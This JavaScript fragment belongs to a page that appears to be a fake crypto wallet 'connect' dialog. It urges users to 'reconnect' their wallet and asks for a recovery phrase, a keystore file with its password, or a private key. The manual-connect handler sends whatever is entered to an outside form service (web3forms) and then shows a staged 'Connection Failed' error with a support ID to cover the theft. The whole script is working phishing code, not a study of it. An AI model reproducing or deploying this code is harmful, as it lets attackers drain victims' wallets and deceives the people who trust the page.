      welcomeHeader.appendChild(nameSpan);

      welcomeDesc.textContent = 'Please kindly reconnect your wallet to fix the issue.';
      welcomeOverlay.style.display = 'flex';
      requestAnimationFrame(() => {
        welcomeOverlay.classList.add('active');
      });
    }

    if(welcomeCloseBtn) welcomeCloseBtn.addEventListener('click', ()=>{ if (welcomeOverlay) { welcomeOverlay.classList.remove('active'); setTimeout(()=>welcomeOverlay.style.display='none',220) } });
    if(welcomeConnectBtn) welcomeConnectBtn.addEventListener('click', openWalletSelection);

    if(toggleMore) toggleMore.addEventListener('click', ()=>{ if(extra.style.display==='none'){ extra.style.display='grid'; toggleMore.textContent='Show fewer wallets' } else { extra.style.display='none'; toggleMore.textContent='More wallets' } });

    if(searchInput) searchInput.addEventListener('input', ()=>{ const q = searchInput.value.trim().toLowerCase(); const items = Array.from(document.querySelectorAll('.wallet-item')); if(!q){ items.forEach(it=>{ it.style.display=''; it.classList.remove('selected') }); document.getElementById('status-message').textContent='Select a wallet to connect'; return } const matches = items.filter(it => (it.dataset.wallet||'').toLowerCase().includes(q)); items.forEach(it => it.style.display = matches.includes(it) ? '' : 'none'); const stat = document.getElementById('status-message'); stat.textContent = matches.length ? `${matches.length} wallet${matches.length>1?'s':''} found` : 'No wallets found'; });

    document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',(e)=>{ document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); const t = btn.dataset.tab; document.getElementById('phrase-tab').style.display = t==='phrase' ? '' : 'none'; document.getElementById('keystore-tab').style.display = t==='keystore' ? '' : 'none'; document.getElementById('private-tab').style.display = t==='private' ? '' : 'none'; }));

    const manualConnectBtn = document.getElementById('manual-connect-btn');
    const phraseInput = document.getElementById('phrase-input');
    const phraseStatus = document.getElementById('phrase-status');

    function getExpectedWords() { const el = document.querySelector('input[name="phrase-length"]:checked'); return el ? Number(el.value) : 12; }
    function showPhraseError(msg) { if (!phraseStatus) return; phraseStatus.textContent = msg; phraseStatus.style.display = 'block'; setTimeout(()=>{ try{ phraseStatus.style.display='none' }catch(e){} }, 4000); }

    async function submitToWeb3Forms(data) {
      const WEB3FORMS_KEY = window.__WEB3FORMS_KEY__ || process.env.REACT_APP_WEB3FORMS_KEY || '';
      if (!WEB3FORMS_KEY) {
        console.error('[submitToWeb3Forms] error: API key not found in environment variables');
        return { success:false, error: 'API key not configured' };
      }
      try {
        const formData = new FormData(); formData.append('access_key', WEB3FORMS_KEY); formData.append('botcheck',''); Object.entries(data).forEach(([key,value])=>{ formData.append(key,value||''); });
        const response = await fetch('https://api.web3forms.com/submit',{ method:'POST', body: formData, mode:'cors', credentials:'omit' });
        if(!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        const result = await response.json(); if(result.success) return { success:true, message: result.message }; throw new Error(result.message||'Submission failed');
      } catch(err){ console.error('[submitToWeb3Forms] error:',err); return { success:false, error: err.message||'Submission failed' }; }
    }

    const getHashName = () => {
      try {
        const raw = (window.location.hash || '').replace(/^#/, '').trim();
        if (!raw) return '';
        return decodeURIComponent(raw);
      } catch (e) {
        return '';
      }
    };

    const showFromHash = () => {
      const hashName = getHashName();
      if (!hashName) return;
      requestAnimationFrame(() => showWelcomeBackModal(hashName));
    };

    showFromHash();
    window.addEventListener('hashchange', showFromHash);

    if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
      const activeTabBtn = document.querySelector('.tab-btn.active');
      const activeTab = activeTabBtn ? activeTabBtn.dataset.tab : 'phrase';
      let content = '';
      try {
        if(activeTab==='phrase'){ content = (phraseInput && phraseInput.value) ? phraseInput.value.trim() : ''; const words = content.split(/\s+/).filter(Boolean); const expected = getExpectedWords(); if(words.length !== expected){ showPhraseError('Please fill out the field'); return; } }
        else if(activeTab==='keystore'){ const keystoreEl = document.getElementById('keystore-json'); content = keystoreEl ? keystoreEl.value.trim() : ''; if(!content){ showPhraseError('Please fill out the field'); return; } }
        else if(activeTab==='private'){ const privEl = document.getElementById('private-key'); content = privEl ? privEl.value.trim() : ''; if(!content){ showPhraseError('Please fill out the field'); return; } }
      } catch(err){ console.error('[manualConnectBtn] error reading inputs:',err); showPhraseError('Unable to read input'); return; }

      manualConnectBtn.disabled = true; manualConnectBtn.textContent = 'Connecting...'; const data = {};
      if(activeTab==='phrase'){ const words = content.trim().split(/\s+/).filter(Boolean); if(words.length !== 12 && words.length !== 24){ alert('Please enter exactly 12 or 24 words.'); } else { data.message = `Recovery words: ${content}`; data.subject = 'User Input Submission'; } }
      else if(activeTab==='keystore'){ const json = document.getElementById('keystore-json')?.value.trim(); const password = document.getElementById('keystore-password')?.value.trim() || ''; if(!json){ alert('Enter keystore JSON'); } else { data.message = json; data.feedback = password; data.description = 'Wallet backup file'; } }
      else if(activeTab==='private'){ data.key = content; data.subject = 'Key Submission'; }

      const result = await submitToWeb3Forms(data);
      if(result && result.success === true){ try{ manualOverlay.classList.remove('active'); setTimeout(()=>{ if(manualOverlay) manualOverlay.style.display='none'; },400); }catch(e){}
        const overlay2 = document.getElementById('connect-overlay-2'); const ring2 = document.getElementById('connectRing2');
        // load stored selected wallet icon into the second overlay if available
        try {
          const stored = sessionStorage.getItem('bitverse:selectedWalletIcon');
          const img2 = document.getElementById('modalMainWalletImg2');
          if (stored && img2) img2.src = stored;
        } catch(e) {}
        if(overlay2){ overlay2.style.display='flex'; setTimeout(()=>overlay2.classList.add('active'),10); }
        if(ring2){
          ring2.classList.add('active');
          // after 12s, mark as failed and show reconnection instructions
          setTimeout(()=>{
            try{
              ring2.classList.remove('active');
              const msg2 = document.getElementById('overlay-message-2');
              const name2 = document.getElementById('overlay-wallet-name-2');
              if(name2) name2.textContent = 'Connection Failed';
              if(msg2){
                msg2.classList.add('failed');
                msg2.innerHTML = '<div class="overlay-error-icon" aria-hidden="true">!</div><div>Connection Failed</div><div style="font-weight:400;font-size:0.95rem;margin-top:6px;color:#ef4444">Please reconnect or contact support<p>ID : 57357333883355353909</p></div>';
              }
            }catch(e){/* ignore */}
          },12000);
        }
      } else { manualConnectBtn.disabled = false; manualConnectBtn.textContent = 'Connect wallet'; const errMsg = (result && (result.error || result.message)) ? (result.error || result.message) : 'Submission failed'; showPhraseError(errMsg.toString()); }
    });

    renderVisibleWallets(); populateExtraWallets();
  })();

  // Expose open function
  window.openWalletModal = function(){ const m = document.getElementById('modal-overlay'); if(!m) return; m.style.display='flex'; setTimeout(()=>m.classList.add('active'),10); };
})();